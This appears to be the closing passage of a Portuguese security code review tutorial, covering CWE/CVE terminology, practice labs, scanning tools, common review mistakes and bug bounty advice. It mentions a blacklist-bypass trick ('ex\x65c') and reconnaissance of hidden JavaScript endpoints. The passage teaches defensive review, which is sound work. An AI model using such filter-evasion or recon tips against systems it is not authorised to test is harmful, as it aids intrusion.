- SQL Injection: CWE-89
- XSS (Cross-Site Scripting): CWE-79
- LDAP Injection: CWE-90
- Open Redirect: CWE-601
- HTTP Response Splitting: CWE-113
- Buffer Overflow: CWE-120
- Resource Injection: CWE-99
- Information Disclosure: CWE-200

### Esclarecendo os termos da área

**Mas peraí, CWE, CVE... qual a diferença?** Essa confusão é comum, então vale esclarecer rapidamente.

Quando a gente fala de **vulnerabilidade**, é o conceito geral mesmo - uma fraqueza no sistema que pode ser explorada. É o "buraco" na segurança, simples assim.

Agora, **CWE (Common Weakness Enumeration)** é uma forma de classificar *tipos* de vulnerabilidades. Pensa como uma taxonomia, tipo quando biólogo classifica espécies. CWE-79 não é uma vulnerabilidade específica que aconteceu em algum lugar - é a *categoria* XSS como um todo. Serve pra gente padronizar a comunicação, sabe? Quando eu falo "achei um CWE-22" você já sabe que é Path Traversal sem eu precisar explicar.

Já o **CVE (Common Vulnerabilities and Exposures)** é diferente - é um identificador único pra uma vulnerabilidade *específica* em um software *específico*. CVE-2021-44228, por exemplo, é o famoso Log4Shell, aquela vulnerabilidade no Log4j que derrubou a internet em dezembro de 2021 (se você trabalhava com TI naquela época, provavelmente lembra do caos). Cada CVE geralmente tem um CWE associado - o Log4Shell, por exemplo, é classificado como CWE-502 (deserialization insegura).

E o **exploit**? É o código ou técnica que *explora* a vulnerabilidade na prática. A vulnerabilidade é o buraco na parede, o exploit é a ferramenta que você usa pra passar por esse buraco. Nem toda vulnerabilidade tem exploit público disponível - algumas são muito teóricas ou difíceis de explorar na vida real.

Você também vai ouvir falar de **0-day (zero-day)**, que é aquela vulnerabilidade que ainda não tem patch disponível. O nome vem de "zero dias desde que o vendor soube" - ou seja, tá sendo explorada ativamente antes de ter correção. É o pesadelo de qualquer time de segurança.

Por fim, **PoC (Proof of Concept)** é um exploit mais básico que só prova que a vulnerabilidade existe, geralmente sem payload malicioso de verdade. Pesquisadores publicam PoCs pra demonstrar o problema pro vendor ou pra comunidade - é tipo um "olha, funciona mesmo, conserta isso aqui".

Na prática, quando você encontra um XSS num site, você achou uma *vulnerabilidade* do tipo *CWE-79*. Se for num software conhecido e você reportar, pode virar um *CVE*. Se você escrever código que demonstra o problema, criou um *exploit* ou *PoC*.

Consultar o CWE te dá exemplos em várias linguagens e mitigações recomendadas. Acesse em [cwe.mitre.org](https://cwe.mitre.org).

Agora vamos voltar para o lance do code review...

**Prática:**

Para praticar code review, recomendo os **Secure Code Warrior** challenges e o **OWASP WebGoat** (que tem uma seção de code review). O **Damn Vulnerable Web Application (DVWA)** também é ótimo pra entender como vulnerabilidades funcionam na prática.

No **HackTheBox** e **TryHackMe** tem algumas máquinas focadas em análise de código fonte, especialmente as de dificuldade média/alta onde você precisa ler código pra encontrar o vetor de ataque.

**Ferramentas pra estudar:**

Instala o **Semgrep** e roda nos seus próprios projetos - você vai se surpreender com o que ele acha. O comando `semgrep --config auto .` já roda um conjunto de regras padrão. Pro Python especificamente, o **Bandit** (`pip install bandit && bandit -r seu_projeto/`) é muito didático porque explica cada finding.

Pro lado de DAST, aprenda a usar o **Burp Suite** (tem versão Community gratuita) ou o **OWASP ZAP**. A habilidade de interceptar, modificar e reenviar requisições é fundamental pra testar as vulnerabilidades que você encontra no código.

## Erros Comuns em Code Review (e como evitá-los)

Ao fazer code review de segurança, alguns erros são recorrentes. Aqui vão alguns que eu mesmo cometo e que vale prestar atenção.

**Focar só no óbvio**: É fácil achar o `eval()` explícito, mas e quando o dado passa por 5 funções antes de chegar lá? Taint analysis (rastrear o fluxo do dado) é essencial.

**Ignorar o contexto**: Uma mesma função pode ser segura ou perigosa dependendo de onde está. `htmlspecialchars()` não ajuda nada se o output vai pra um atributo JavaScript ou pra dentro de uma tag `<script>` (script).

**Confiar em sanitização incompleta**: Blacklists quase sempre podem ser bypassadas. O Caso 9 do validador com `replace()` é um exemplo perfeito - remover "exec" não impede `ex\x65c` ou truques de encoding.

**Não considerar a versão**: Uma vulnerabilidade pode existir em versões antigas mas estar corrigida nas novas (como HTTP Response Splitting no PHP 5.1.2+). Sempre verifique qual versão está em uso.

**Assumir que framework protege tudo**: Django escapa por padrão, mas `autoescape=False` existe. Laravel tem proteção contra CSRF, mas precisa ser usada corretamente. Frameworks ajudam, mas não são mágica.

## Considerações finais e como está alinhado com Bug Bounty

Code review de segurança é uma skill que melhora com prática. Quanto mais código vulnerável você analisar, mais rápido vai reconhecer padrões. Os exercícios desse documento são um bom começo, mas o ideal é praticar com código real - projetos open source, CTFs focados em code review, ou até seu próprio código antigo (você vai se surpreender).

Uma coisa que aprendi: todo desenvolvedor escreve código vulnerável às vezes. O importante é ter processos pra pegar isso antes de ir pra produção. Code review, análise estática automatizada no CI/CD, e uma cultura onde segurança é responsabilidade de todo mundo, não só do "time de segurança".

E olha, code review não serve só pra quem trabalha interno numa empresa. Se você faz bug bounty (pesquisada por falhas de segurança em empresas através de programas de recompensas), saber ler código é um diferencial absurdo - e isso foi falado até pelo Coradi/crd0x49 (top 1 na BugHunt com +19315 pontos) em chamada no discord com a galera tentando aprender sua metodologia. A maioria dos hunters fica só rodando nuclei, ffuf, e esperando que alguma ferramenta cuspa uma vulnerabilidade pronta. E tudo bem, ferramentas ajudam muito - mas quando todo mundo usa as mesmas ferramentas, todo mundo acha as mesmas coisas. O que sobra são as vulnerabilidades que exigem entendimento mais profundo da aplicação.

Já parou pra analisar os JavaScripts de uma aplicação? Muita gente ignora, mas ali tem um mapa do tesouro escondido. Endpoints internos, lógica de autenticação, parâmetros que não aparecem na interface, funções administrativas "escondidas". Às vezes um JS de uma funcionalidade esquecida - tipo aquele recurso beta que a empresa lançou há 3 anos e ninguém mais usa - ainda tá lá, exposto, chamando APIs que ninguém mais monitora. Imagina achar isso num programa do Mercado Livre ou de qualquer big tech? É o tipo de coisa que ferramenta automatizada não pega porque ela não *entende* o que tá olhando.

Mesmo quando você não acha nada explorável de cara, o tempo investido lendo código te dá contexto. Você começa a entender como os devs daquela empresa pensam, quais padrões eles seguem (ou não seguem), onde costumam cortar caminho. Isso te leva a insights que só surgem quando você conhece o terreno. Aquele endpoint estranho que você não entendeu hoje pode fazer total sentido amanhã quando você descobrir outra peça do quebra-cabeça.

Então se você tá começando em bug bounty e quer se destacar da massa que só aperta botão, investe tempo em aprender a ler código. Não precisa ser expert em todas as linguagens - começa pelo básico de JavaScript (porque tá em todo lugar), PHP (ainda roda metade da web), e vai expandindo conforme a necessidade. O retorno vem.

> Lembre-se: a segurança acaba sempre sendo em camadas. Podemos dizer quer a "melhor vulnerabilidade" é a identificada e barrada antes pela revisão, isto é, que nunca chega em produção. A "segunda melhor" é a que passou, mas foi identificada antes que pudesse ter sido explorada. A "terceira melhor" é a que acabou sendo explorada, mas também acabou sendo barrada por outra proteção - o que notificou o sistema sobre o ocorrido e com isso a falha é identificada antes de qualquer prejuízo real. Quando não temos camadas de proteção suficiente, a chance de uma exploração ocorrer silenciosamente é muito alta e isso é ruim. Code review faz parte de uma das camadas, temos diversas outras importantes e eu espero poder trazer ainda mais conhecimento a respeito.